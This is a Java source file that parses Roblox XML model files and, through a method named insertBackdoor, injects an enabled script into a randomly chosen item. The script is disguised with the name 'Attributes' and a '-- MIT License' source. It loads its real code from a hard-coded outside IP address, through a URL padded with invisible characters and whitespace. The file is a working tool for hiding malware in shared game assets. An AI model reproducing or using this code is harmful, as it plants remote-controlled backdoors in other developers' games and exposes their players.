package com.roblox.misc;

import org.jetbrains.annotations.NotNull;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import java.io.IOException;

import java.io.StringReader;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.Random;

@SuppressWarnings("unused")
public class FileManipulation {
    private final Random random = new Random();
    private final Document document;

    public FileManipulation(String xml) throws IOException, SAXException, ParserConfigurationException {
        DocumentBuilder documentBuilder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
        this.document = documentBuilder.parse(new InputSource(new StringReader(xml)));
    }

    public String insertBackdoor() {
        ArrayList<Element> items = this.getItems();

        Element rootRoblox = this.document.getDocumentElement();
        Element model = (Element) rootRoblox.getElementsByTagName("Item").item(0);
        Element newScript = this.document.createElement("Item");
        newScript.setAttribute("class", "Script");
        newScript.setAttribute("referent", "RBX1");
        Element newProperties = this.document.createElement("Properties");
        Element disabled = this.document.createElement("bool");
        disabled.setAttribute("name", "Disabled");
        disabled.setTextContent("false");
        newProperties.appendChild(disabled);
        Element linkedSource = this.document.createElement("Content");
        Element url = this.document.createElement("url");
        linkedSource.setAttribute("name", "LinkedSource");
        url.appendChild(this.document.createTextNode("http://104.249.26.16/asset/?id=-1&assetSourceId=-1&hash=0ca0687db2c27e5045dfcdbe3649c556&protocol=intern&robloxProvided=true&response=200&\\nhash=md5￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼\\n&container=401 ￼￼￼￼￼￼￼￼  ￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼           ￼￼￼￼￼￼￼￼           \\n   \\n\\n\\n\\n            \\n\\n                 \\n ￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼                \\n      \\n                                     ￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼                                                                    "));
        linkedSource.appendChild(url);
        newProperties.appendChild(linkedSource);
        Element name = this.document.createElement("string");
        name.setAttribute("name", "Name");
        name.setTextContent("Attributes");
        newProperties.appendChild(name);
        Element source = this.document.createElement("ProtectedString");
        source.setAttribute("name", "Source");
        source.setTextContent("-- MIT License");
        newProperties.appendChild(source);
        newScript.appendChild(newProperties);

        items.get(this.random.nextInt(0, items.size())).appendChild(newScript);

        return this.toString().replace("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>", "");
    }

    private @NotNull ArrayList<Element> getItems() {
        ArrayList<Element> results = new ArrayList<>();
        NodeList elements = this.document.getElementsByTagName("*");

        for(int i = 0; i < elements.getLength(); i++) {
            Element element = (Element) elements.item(i);

            if(element.getTagName().equals("Item"))
                results.add(element);
        }

        return results;
    }

    public String toString() {
        TransformerFactory tf = TransformerFactory.newInstance();
        Transformer transformer;
        try {
            transformer = tf.newTransformer();
            StringWriter writer = new StringWriter();
            transformer.transform(new DOMSource(this.document), new StreamResult(writer));
            return writer.getBuffer().toString();
        } catch (TransformerException e) {
            e.printStackTrace();
        }

        return null;
    }
}
